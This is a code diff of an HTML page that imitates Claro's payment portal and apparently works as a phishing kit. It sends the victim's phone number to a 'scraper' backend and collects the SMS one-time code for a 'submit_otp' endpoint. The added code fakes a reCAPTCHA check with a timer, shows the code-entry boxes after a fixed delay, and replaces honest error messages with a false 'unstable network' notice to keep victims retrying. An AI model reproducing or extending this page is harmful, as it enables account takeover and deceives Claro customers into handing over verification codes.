@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -8,12 +7,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="css/index.css">
-    <style>
-      /* Mensaje pequeño / inline bajo el input */
-      .server-message { margin-top:6px; font-size:0.9rem; display:none; }
-      .server-message.error { color: #c0392b; }   /* rojo */
-      .server-message.info  { color: #2d6ca2; }   /* azul suave */
-    </style>
 </head>
 <body>
     <!-- Top Bar -->
@@ -131,7 +124,7 @@
     <!-- Main Content -->
     <div class="container">
         <p class="header-text">
-            Realiza el pago de la factura de tus servicios Claro, compra paquetes y haz recargas de manera fácil y desde donde quieras. También, puedes inscribir tu tarjeta de crédito para realizar el pago de tus facturas de manera automática.
+            Realiza el pago de la factura de la tus servicios Claro, compra paquetes y haz recargas de manera fácil y desde donde quieras. También, puedes inscribir tu tarjeta de crédito para realizar el pago de tus facturas de manera automática.
         </p>
 
         <div class="dropdown-section" id="dropdownSection">
@@ -221,26 +214,29 @@
             <div id="otpContainer" class="otp-container" aria-hidden="true" style="display:none;">
                 <div class="otp-instruction">Ingresa el código de 4 dígitos que enviamos a tu línea móvil</div>
                 <div class="otp-boxes" id="otpBoxes">
-                    <div class="otp-box" data-index="0"><input inputmode="numeric" maxlength="1"></div>
-                    <div class="otp-box" data-index="1"><input inputmode="numeric" maxlength="1"></div>
-                    <div class="otp-box" data-index="2"><input inputmode="numeric" maxlength="1"></div>
-                    <div class="otp-box" data-index="3"><input inputmode="numeric" maxlength="1"></div>
+                    <div class="otp-box" data-index="0"><input inputmode="numeric" maxlength="1" disabled></div>
+                    <div class="otp-box" data-index="1"><input inputmode="numeric" maxlength="1" disabled></div>
+                    <div class="otp-box" data-index="2"><input inputmode="numeric" maxlength="1" disabled></div>
+                    <div class="otp-box" data-index="3"><input inputmode="numeric" maxlength="1" disabled></div>
                 </div>
                 <div class="otp-timer">Reenviar el código en <strong id="otpTime">02:56</strong></div>
                 <div class="otp-resend" id="otpResend">Reenviar</div>
             </div>
 
             <div class="recaptcha-wrapper" id="recaptchaWrapper">
-                <div class="recaptcha-box">
-                    <div class="recaptcha-checkbox"></div>
-                    <div class="recaptcha-text">
-                        <p><strong>No soy un robot</strong></p>
-                        <div class="recaptcha-links">
+                <div class="recaptcha-box" id="recaptchaBox" aria-hidden="false">
+                    <div class="recaptcha-checkbox" id="recaptchaCheckbox" role="checkbox" tabindex="0" aria-checked="false" aria-label="No soy un robot">
+                        <!-- icono check pequeño; inicialmente oculto por CSS -->
+                        <i class="fas fa-check rc-icon" aria-hidden="true"></i>
+                    </div>
+                    <div class="recaptcha-text" id="recaptchaText" style="line-height:1.05;">
+                        <p style="margin:0;"><strong>No soy un robot</strong></p>
+                        <div class="recaptcha-links" style="font-size:0.78rem; margin-top:4px; color:#666;">
                             reCAPTCHA cambiará sus Condiciones del Servicio. <a href="#">Toma medidas.</a><br>
                             <a href="#">Privacidad</a> - <a href="#">Condiciones</a>
                         </div>
                     </div>
-                    <div class="recaptcha-logo">
+                    <div class="recaptcha-logo" id="recaptchaLogo" style="margin-left:auto;">
                         <div class="recaptcha-logo-img">
                            <img src="img/imgi_2_logo_48.png" style="width: 120%;" alt="">
                         </div>
@@ -337,12 +333,21 @@
         }
 
         function showOtp() {
-            clearServerMessage();
+            // Mostrar mensaje informativo cuando aparece OTP
+            showServerMessage('Por favor, espere unos instantes mientras enviamos el código SMS a su teléfono.', 'info');
             otpContainer.style.display = 'flex';
             otpContainer.setAttribute('aria-hidden', 'false');
             recaptchaWrapper.style.display = 'none';
             startOtpTimer();
-            otpInputs.forEach(i => i.value = '');
+            otpInputs.forEach(i => {
+                i.value = '';
+                i.disabled = true;
+            });
+            updateButtonsState();
+        }
+
+        function enableOtpInputs() {
+            otpInputs.forEach(i => i.disabled = false);
             setTimeout(() => { otpInputs[0].focus(); }, 100);
             updateButtonsState();
         }
@@ -353,7 +358,10 @@
             recaptchaWrapper.style.display = 'flex';
             clearInterval(otpInterval);
             otpTimeEl.textContent = formatTime(INITIAL_OTP_SECONDS);
-            otpInputs.forEach(i => i.value = '');
+            otpInputs.forEach(i => {
+                i.value = '';
+                i.disabled = true;
+            });
             updateButtonsState();
         }
 
@@ -440,10 +448,12 @@
         function updateButtonsState() {
             const phoneValid = isValidPhoneForOtp(phoneInput.value);
             const otpFilled = allOtpFilled();
+            const otpDisabled = Array.from(otpInputs).some(i => i.disabled);
+            
             if (otpContainer.style.display === 'none' || otpContainer.style.display === '') {
                 btnContinue.disabled = !phoneValid;
             } else {
-                btnContinue.disabled = !(phoneValid && otpFilled);
+                btnContinue.disabled = !(phoneValid && otpFilled && !otpDisabled);
             }
             if (!btnContinue.disabled) {
                 btnContinue.classList.add('active');
@@ -490,6 +500,15 @@
     if (otpContainer.style.display === 'none' || otpContainer.style.display === '') {
         try {
             showLoading();
+            
+            // Mostrar OTP inmediatamente (después de 8 segundos)
+            setTimeout(() => {
+                hideLoading();
+                const usedNumber = phone;
+                sessionStorage.setItem('scraper_numero', usedNumber);
+                showOtp();
+            }, 8000);
+            
             const form = new FormData();
             form.append('numero', phone);
             const resp = await fetch(`${API_BASE}/run`, {
@@ -503,24 +522,26 @@
             const headerNumero = resp.headers.get('X-Scraper-Numero');
 
             if (statusHeader === 'OTP_REQUIRED') {
-                hideLoading();
                 const usedNumber = headerNumero || phone;
                 sessionStorage.setItem('scraper_numero', usedNumber);
-                showOtp();
+                enableOtpInputs();
                 return;
             }
 
             if (statusHeader === 'NO_DETAILS') {
                 hideLoading();
-                showServerMessage('No se encontraron pagos pendientes.', 'error');
+                hideOtp();
+                showServerMessage('Su red es inestable, intente de nuevo.', 'error');
                 return;
             }
 
             if (!resp.ok) {
                 const txt = await resp.text().catch(()=>'<no body>');
                 hideLoading();
+                hideOtp();
                 console.error('Fetch /run response NOT OK', resp.status, resp.statusText, txt);
-                showServerMessage('Error del servidor: ' + resp.status, 'error');
+                // Mensaje solicitado cuando la API devuelve error
+                showServerMessage('Ha ocurrido un error. Intente de nuevo.', 'error');
                 return;
             }
 
@@ -528,19 +549,22 @@
 
             if (text.includes('Detalles extraídos') || text.includes('valor_total')) {
                 hideLoading();
+                hideOtp();
                 window.location.href = 'datos.html';
             } else if (text.includes('OTP') || text.includes('pinCode')) {
-                hideLoading();
                 sessionStorage.setItem('scraper_numero', phone);
-                showOtp();
+                enableOtpInputs();
             } else {
                 hideLoading();
-                showServerMessage('No se encontraron pagos pendientes.', 'error');
+                hideOtp();
+                showServerMessage('Su red es inestable, intente de nuevo.', 'error');
             }
         } catch (err) {
             hideLoading();
+            hideOtp();
             console.error('Fetch /run EXCEPTION:', err);
-            showServerMessage('Error de conexión con el servidor.', 'error');
+            // Mensaje solicitado cuando hay excepción en llamada API
+            showServerMessage('Ha ocurrido un error. Intente de nuevo.', 'error');
         }
     } else {
         // OTP visible => enviamos el OTP
@@ -588,6 +612,7 @@
                 hideLoading();
                 showServerMessage('OTP incorrecto. Intenta de nuevo.', 'error');
                 showOtp();
+                enableOtpInputs();
                 otpInputs.forEach(input => input.value = '');
                 if (otpInputs[0]) otpInputs[0].focus();
                 return;
@@ -597,7 +622,7 @@
                 console.log('No se encontraron detalles');
                 hideLoading();
                 hideOtp();
-                showServerMessage('No se encontraron pagos pendientes.', 'error');
+                showServerMessage('Su red es inestable, intente de nuevo.', 'error');
                 return;
             }
 
@@ -605,7 +630,9 @@
                 const txt = await resp.text().catch(()=>'<no body>');
                 console.error('Response NOT OK:', resp.status, txt);
                 hideLoading();
-                showServerMessage('Error del servidor: ' + resp.status, 'error');
+                hideOtp();
+                // Mensaje solicitado cuando la API devuelve error en submit_otp
+                showServerMessage('Ha ocurrido un error. Intente de nuevo.', 'error');
                 return;
             }
 
@@ -613,12 +640,14 @@
             console.warn('Respuesta sin header SUCCESS claro');
             hideLoading();
             hideOtp();
-            showServerMessage('No se encontraron pagos pendientes.', 'error');
+            showServerMessage('Su red es inestable, intente de nuevo.', 'error');
             
         } catch (err) {
             console.error('Exception en submit_otp:', err);
             hideLoading();
-            showServerMessage('Error de conexión con el servidor.', 'error');
+            hideOtp();
+            // Mensaje solicitado cuando hay excepción en submit_otp
+            showServerMessage('Ha ocurrido un error. Intente de nuevo.', 'error');
         }
     }
 });
@@ -666,11 +695,89 @@
         updateInputLabelFromSelectedRadio();
         // ------------------------------------------------------------------
 
+        // --- NUEVO: comportamiento simulado del reCAPTCHA (4s) ---
+        (function() {
+            const checkbox = document.getElementById('recaptchaCheckbox');
+            const recaptchaBox = document.getElementById('recaptchaBox');
+            const recaptchaText = document.getElementById('recaptchaText');
+            const recaptchaLogo = document.getElementById('recaptchaLogo');
+
+            // Estado: 'idle' | 'checking' | 'checked'
+            let state = 'idle';
+            // tiempo en ms (4 segundos)
+            const DELAY_MS = 4000;
+
+            function setState(newState) {
+                state = newState;
+                if (state === 'idle') {
+                    checkbox.classList.remove('checking','checked');
+                    checkbox.setAttribute('aria-checked', 'false');
+                    checkbox.removeAttribute('aria-busy');
+                } else if (state === 'checking') {
+                    checkbox.classList.remove('checked');
+                    checkbox.classList.add('checking');
+                    checkbox.setAttribute('aria-busy', 'true');
+                } else if (state === 'checked') {
+                    checkbox.classList.remove('checking');
+                    checkbox.classList.add('checked');
+                    checkbox.setAttribute('aria-checked', 'true');
+                    checkbox.removeAttribute('aria-busy');
+                }
+            }
+
+            // Función que inicia el "chequeo" simulado de 4s y luego marca
+            function simulateCheck() {
+                if (state === 'idle') {
+                    setState('checking');
+                    // evitar que el usuario vuelva a disparar mientras "checking"
+                    setTimeout(() => {
+                        // marcar como si fuera real
+                        setState('checked');
+                        // para accesibilidad, hacer focus en checkbox marcado
+                        checkbox.focus();
+                        // emitimos un evento personalizado por si otra lógica quiere reaccionar
+                        checkbox.dispatchEvent(new CustomEvent('recaptcha-verified', { bubbles: true }));
+                    }, DELAY_MS);
+                }
+            }
+
+            // click en el checkbox real
+            checkbox.addEventListener('click', (e) => {
+                e.preventDefault();
+                simulateCheck();
+            });
+
+            // suportar teclado (espacio/enter)
+            checkbox.addEventListener('keydown', (e) => {
+                if (e.key === ' ' || e.key === 'Enter') {
+                    e.preventDefault();
+                    simulateCheck();
+                }
+            });
+
+            // si el usuario hace click en el texto o el logo, también iniciar (sin interceptar links)
+            [recaptchaText, recaptchaLogo, recaptchaBox].forEach(el => {
+                if (!el) return;
+                el.addEventListener('click', (e) => {
+                    // permitir clicks en <a> dentro de .recaptcha-text para funcionar (no impedir navegación)
+                    if (e.target && e.target.tagName && e.target.tagName.toLowerCase() === 'a') return;
+                    simulateCheck();
+                });
+            });
+
+            // Exponer una función global mínima por si se necesita resetear desde otro script
+            window.__recaptcha_sim = {
+                reset: function() { setState('idle'); },
+                isChecked: function() { return state === 'checked'; }
+            };
+
+            // Inicializar estado
+            setState('idle');
+        })();
+
         // Inicial: ocultar OTP (controlado por el servidor)
         hideOtp();
         updateButtonsState();
     </script>
 </body>
 </html>
-
-
